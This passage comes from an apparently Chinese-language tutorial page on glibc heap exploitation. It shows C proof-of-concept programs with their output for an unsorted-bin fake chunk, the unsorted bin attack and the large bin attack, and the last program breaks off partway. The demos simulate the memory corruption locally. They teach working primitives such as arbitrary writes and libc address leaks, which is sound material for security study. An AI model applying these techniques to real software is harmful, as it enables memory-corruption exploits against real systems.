</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the chunk %p, it will be inserted in the unsorted bin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Create a fake chunk on the stack&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Set size for next allocation and the bk pointer to any writable address&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>stack_buffer</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=p>)</span><span class=n>stack_buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>victim</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span><span class=p>)</span><span class=n>stack_buffer</span><span class=p>;</span> <span class=c1>// victim-&gt;bk is pointing to stack
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now next malloc will return the region of our fake chunk: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_buffer</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(0x100): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Allocating the victim chunk
</span></span><span class=line><span class=cl>Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
</span></span><span class=line><span class=cl>Freeing the chunk 0x2020010, it will be inserted in the unsorted bin
</span></span><span class=line><span class=cl>Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer
</span></span><span class=line><span class=cl>Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt;av-&gt;system_mem
</span></span><span class=line><span class=cl>Now next malloc will return the region of our fake chunk: 0x7ffe82ca7160
</span></span><span class=line><span class=cl>malloc(0x100): 0x7ffe82ca7160
</span></span></code></pre></td></tr></table></div></div><p>首先分配一个 0x100 的 chunk<code>victim</code>，在下面再垫一个 chunk 防止与 top chunk 合并，释放 <code>victim</code> 进入 unsorted bin。现在在栈上伪造大小为 <code>0x110</code> 的 chunk，并使其 <code>bk</code> 指向任意一个可写地址，比如自身。</p><p>假设存在漏洞可以修改 <code>victim</code> 的 <code>chunk_size</code> 和 <code>bk</code>，那么我们可以将它的 <code>chunk_size</code> 改为合法 <code>nextsize</code> 范围内的一个值，且小于 0x100。而 <code>bk</code> 则改为我们刚才伪造的 chunk。这样下一次 <code>malloc(0x100)</code> 就会顺着 <code>bk</code> 查找，首先找到 <code>victim</code> 但大小不够，放入 small bin。随后找到我们伪造的 chunk 并返回，此时伪造 chunk 的 <code>fd</code> 已经指向 <code>main_arena+88</code>，可以借此泄露 libc。</p><h2 id=unsorted_bin_attack>unsorted_bin_attack</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &#34;</span>
</span></span><span class=line><span class=cl>		   <span class=s>&#34;global variable global_max_fast in libc for further fastbin attack</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>stack_var</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s first look at the target we want to rewrite on stack:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%p: %ld</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>,</span> <span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p</span><span class=o>=</span><span class=n>malloc</span><span class=p>(</span><span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we allocate first normal chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another normal chunk in order to avoid consolidating the top chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the first one during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>malloc</span><span class=p>(</span><span class=mi>500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &#34;</span>
</span></span><span class=line><span class=cl>		   <span class=s>&#34;point to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=o>-</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>p</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>malloc</span><span class=p>(</span><span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been&#34;</span>
</span></span><span class=line><span class=cl>		   <span class=s>&#34;rewritten:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%p: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates unsorted bin attack by write a large unsigned long value into stack
</span></span><span class=line><span class=cl>In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s first look at the target we want to rewrite on stack:
</span></span><span class=line><span class=cl>0x7fff4c4511e8: 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now, we allocate first normal chunk on the heap at: 0x1023010
</span></span><span class=line><span class=cl>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f60208a2b78
</span></span><span class=line><span class=cl>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
</span></span><span class=line><span class=cl>And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff4c4511d8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s malloc again to get the chunk we just free. During this time, the target should have already been rewritten:
</span></span><span class=line><span class=cl>0x7fff4c4511e8: 0x7f60208a2b78
</span></span></code></pre></td></tr></table></div></div><p>和上一个类似，我们看到在 <code>free(p1)</code> 后，其 <code>bk</code> 指向 <code>main_arena+88</code>。假设存在漏洞可以修改其 <code>bk</code>，那么我们修改成目标地址 - 0x10 的位置，相当于伪造了一个 fake chunk。那么我们在拿回 <code>p1</code> 的时候，我们的 fake chunk 会被认为是 unsorted bin 中的下一个 chunk，因此其 <code>bk</code> 也被修改为 <code>main_arena+88</code>，于是我们在栈上写入了一个 <code>unsigned long</code> 值。</p><h2 id=large_bin_attack>large_bin_attack</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    This technique is taken from
</span></span></span><span class=line><span class=cl><span class=cm>    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>              else
</span></span></span><span class=line><span class=cl><span class=cm>              {
</span></span></span><span class=line><span class=cl><span class=cm>                  victim-&gt;fd_nextsize = fwd;
</span></span></span><span class=line><span class=cl><span class=cm>                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
</span></span></span><span class=line><span class=cl><span class=cm>                  fwd-&gt;bk_nextsize = victim;
</span></span></span><span class=line><span class=cl><span class=cm>                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
</span></span></span><span class=line><span class=cl><span class=cm>              }
</span></span></span><span class=line><span class=cl><span class=cm>              bck = fwd-&gt;bk;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    mark_bin (av, victim_index);
</span></span></span><span class=line><span class=cl><span class=cm>    victim-&gt;bk = bck;
</span></span></span><span class=line><span class=cl><span class=cm>    victim-&gt;fd = fwd;
</span></span></span><span class=line><span class=cl><span class=cm>    fwd-&gt;bk = victim;
</span></span></span><span class=line><span class=cl><span class=cm>    bck-&gt;fd = victim;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    For more details on how large-bins are handled and sorted by ptmalloc,
</span></span></span><span class=line><span class=cl><span class=cm>    please check the Background section in the aforementioned link.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span><span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates large bin attack by writing a large unsigned long value into stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;global variable global_max_fast in libc for further fastbin attack</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>stack_var1</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>stack_var2</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s first look at the targets we want to rewrite on stack:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var1 (%p): %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var1</span><span class=p>,</span> <span class=n>stack_var1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var2 (%p): %ld</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var2</span><span class=p>,</span> <span class=n>stack_var2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x320</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we allocate the first large chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the first large chunk during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Then, we allocate the second large chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p2</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the second large chunk during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>p3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Finally, we allocate the third large chunk on the heap at: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;the third large chunk during the free()</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We free the first and second large chunks now and they will be inserted in the unsorted bin:&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;[%p &lt;--&gt; %p ]</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p2</span> <span class=o>-</span> <span class=mi>2</span><span class=p>),</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p2</span><span class=p>[</span><span class=mi>0</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x90</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;[%p]</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span> <span class=o>+</span> <span class=mh>0x90</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we free the third large chunk and it will be inserted in the unsorted bin:&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;[%p &lt;--&gt; %p ]</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p3</span> <span class=o>-</span> <span class=mi>2</span><span class=p>),</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)(</span><span class=n>p3</span><span class=p>[</span><span class=mi>0</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//------------VULNERABILITY-----------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s </span><span class=se>\&#34;</span><span class=s>size</span><span class=se>\&#34;</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;as well as its </span><span class=se>\&#34;</span><span class=s>bk</span><span class=se>\&#34;</span><span class=s>and </span><span class=se>\&#34;</span><span class=s>bk_nextsize</span><span class=se>\&#34;</span><span class=s>pointers</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;at the head of the large bin freelist. To overwrite the stack variables, we set </span><span class=se>\&#34;</span><span class=s>bk</span><span class=se>\&#34;</span><span class=s>to 16 bytes before stack_var1 and&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;</span><span class=se>\&#34;</span><span class=s>bk_nextsize</span><span class=se>\&#34;</span><span class=s>to 32 bytes before stack_var2</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x3f1</span><span class=p>;</span>
